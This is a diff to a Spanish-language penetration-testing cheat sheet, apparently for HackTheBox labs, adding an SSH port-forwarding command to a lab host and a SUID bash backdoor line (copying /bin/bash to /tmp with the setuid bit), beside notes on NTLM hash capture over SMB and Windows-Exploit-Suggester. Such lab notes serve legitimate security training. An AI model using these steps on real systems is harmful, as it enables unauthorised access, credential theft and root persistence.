@@ -2,7 +2,15 @@
 
 
 
-# smb
+## Local port fowarding
+
+esto desde la maquina atacante, es decir, tu mismo, esto se conecta por ssh a la maquina victima y levanta el tunel por ese puerto.
+
+```bash
+ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
+```
+
+## smb
 
 crear una carpeta compartida rapida por smb y poder capturar hashes NTLM
 
@@ -93,3 +101,11 @@ python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
 ```bash
 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo
 ```
+
+
+
+
+
+bash SUID
+
+cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
